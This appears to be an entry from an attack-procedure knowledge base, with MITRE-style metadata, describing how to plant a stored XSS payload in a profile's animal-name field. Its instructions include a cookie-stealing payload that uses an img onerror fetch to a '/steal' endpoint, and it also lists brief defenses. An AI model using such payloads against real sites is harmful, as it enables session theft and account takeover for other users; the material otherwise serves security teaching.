---
id: proc-inject-stored-xss-payload
tags:
  - xss-injection
  - payload-delivery
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:38.060Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload

## Summary

This procedure injects a malicious JavaScript payload into the animal name field on the user profile, exploiting lack of input sanitization for stored XSS.

## Description

Stored XSS occurs when user input is persisted without escaping and rendered in other users' views. Here, the animal name field on the profile page is vulnerable, allowing scripts to execute when profiles are viewed. Payloads like <script>alert('XSS')</script> are saved and later reflected unsanitized.

## Requirements

1. Authenticated session as attacker
2. Access to profile settings page
3. Knowledge of effective XSS payloads

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all user inputs with HTML entity encoding
- Use Content Security Policy (CSP) to restrict script execution
- Scan for script tags in stored data

## Objectives

1. Persist malicious script in profile data
2. Ensure payload survives storage and retrieval
3. Set up for execution on victim views

## Instructions

### Step 1: Access Profile Settings

**Context**: Navigate to editable profile fields.

From the dashboard, go to profile or settings page (e.g., /profile/edit).

> Expected output: Form with animal name input field.

### Step 2: Enter and Save Payload

**Context**: Inject the XSS script into the vulnerable field.

In the animal name field, input: <script>alert(document.cookie);</script> or <img src=x onerror=fetch('/steal?cookie='+document.cookie)>. Save changes.

> Expected output: Profile updated; no validation errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[stored-xss]]
- [[javascript-injection]]
